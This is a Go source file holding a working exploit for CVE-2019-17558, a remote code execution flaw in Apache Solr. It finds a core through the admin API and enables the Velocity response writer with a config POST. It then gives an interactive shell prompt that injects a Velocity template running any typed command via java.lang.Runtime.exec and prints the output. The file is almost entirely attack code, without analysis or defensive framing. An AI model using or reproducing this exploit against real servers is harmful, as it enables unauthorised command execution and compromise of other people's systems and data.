package main

import (
	"bufio"
	"bytes"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/http"
	"net/url"
	"os"
	"strings"
)

func Cve_2019_17558() {
	fmt.Println("[*] cve-2019-17558 test starting")
	fmt.Print("[*] input url: ")
	reader1 := bufio.NewReader(os.Stdin)
	url1, _, err := reader1.ReadLine()
	if err != nil {
		panic(err)
	}
	url2 := string(url1) + "/solr/admin/cores?indexInfo=false&wt=json"
	rep1, err := http.Get(string(url2))
	if err != nil {
		panic(err)
	}
	body1, err := ioutil.ReadAll(rep1.Body)
	if err != nil {
		panic(err)
	}
	// fmt.Println(string(body1))
	map1 := make(map[string]interface{})
	err1 := json.Unmarshal([]byte(string(body1)), &map1)
	if err1 != nil {
		panic(err1)
	}
	map2 := map1["status"].(map[string]interface{})
	map3 := map2["demo"].(map[string]interface{})
	core_name := map3["name"]
	url3 := string(url1) + "/solr/" + core_name.(string) + "/config"
	fmt.Println("[*] GET API URL: ", url3)

	data := `{"update-queryresponsewriter": {"startup": "lazy","name": "velocity","class": "solr.VelocityResponseWriter","template.base.dir": "","solr.resource.loader.enabled": "true","params.resource.loader.enabled": "true"}}`
	req1, err := http.NewRequest("POST", url3, bytes.NewBuffer([]byte(data)))
	if err != nil {
		panic(err)
	}
	req1.Header.Add("Content-Type", "application/json")
	var client http.Client

	rep2, err := client.Do(req1)
	if err != nil {
		panic(err)
	}
	fmt.Println(rep2.Status)

	reader2 := bufio.NewReader(os.Stdin)
	for {
		fmt.Print("cmd>> ")
		cmd1, _, err := reader2.ReadLine()
		if err != nil {
			panic(err)
		}
		if string(cmd1) == "exit" {
			break
		}
		cmd2 := url.QueryEscape(string(cmd1))

		url4 := string(url1) + "/solr/" + core_name.(string) + "/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27" + string(cmd2) + "%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end"
		rep3, err := http.Get(url4)
		if err != nil {
			panic(err)
		}
		body5, _ := ioutil.ReadAll(rep3.Body)
		if strings.Contains(rep3.Status, "500") {
			fmt.Println("[-] command error")
		} else {
			fmt.Println(string(body5))
		}

	}

}
